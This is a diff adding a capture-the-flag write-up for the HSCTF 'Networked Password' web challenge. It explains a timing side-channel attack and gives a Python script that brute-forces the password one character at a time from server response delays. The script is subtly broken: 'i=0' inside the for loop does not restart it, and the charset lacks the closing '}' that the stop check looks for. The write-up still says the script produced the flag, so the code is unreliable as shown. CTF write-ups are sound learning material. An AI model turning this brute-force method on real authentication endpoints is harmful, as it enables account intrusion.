@@ -678,4 +678,53 @@ Running this we get this after more than 250000000 iterations.
 Here's our flag `hsctf{php_type_juggling_is_fun}`
 
 
+# **WEB**
 
+## Networked Password -:
+> description: 
+
+
+<img src="assets/web/networked_pass.png" width="450px" height="450px" >
+
+
+### Solution:
+
+We are given a https://networked-password.web.chal.hsctf.com/ which prompts us to submit a password having a simple form to fill it up, but from the description we see thats its delays some thing we don't know what until i saw a time differnece in our inputs like for a gibberish we see fast output but for a flag like "hsctf{" it delayed a bit. And there was a hint given as well-:
+
+> Hint : You know the flag format
+
+<img src="assets/web/Capture4.PNG" width="650px" height="450px" >
+
+So after attempting few times i got that every character adds 0.45-0.5 seconds.But running this script you need a better internet connection.So i tried running using online interpeter there's are ton of available. You can use https://repl.it/languages/python3 or https://codeanywhere.com/editor/ you need these because of their fast servers.
+
+And At last my first *timing attack challenge*. 
+```python
+import requests
+import datetime
+
+URL="https://networked-password.web.chal.hsctf.com/"
+charset="_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%*-'"
+flag="hsctf{"
+
+DATA={'password':flag}
+r=requests.post(url=URL,data=DATA)
+realtime=r.elapsed.total_seconds()
+print("The Current Time:"+str(realtime)) # printing for debugging
+
+for i in range(len(charset)):
+    DATA={'password':flag+charset[i]}
+    r=requests.post(url=URL,data=DATA)
+    nexttime=r.elapsed.total_seconds()
+    print("[+]Testing:"+str(nexttime))   # printing for debugging
+    if(realtime+0.4<nexttime):
+        realtime=nexttime
+        if(charset[i]=='}'):
+            print("The final flag is"+flag )
+            exit(0)
+        flag+=charset[i]
+        print("Current flag->"+ flag)
+        i=0
+exit(0)
+```
+Here's the flag after so much running `hsctf{sm0l_fl4g}`
+Glad they had the small flag.
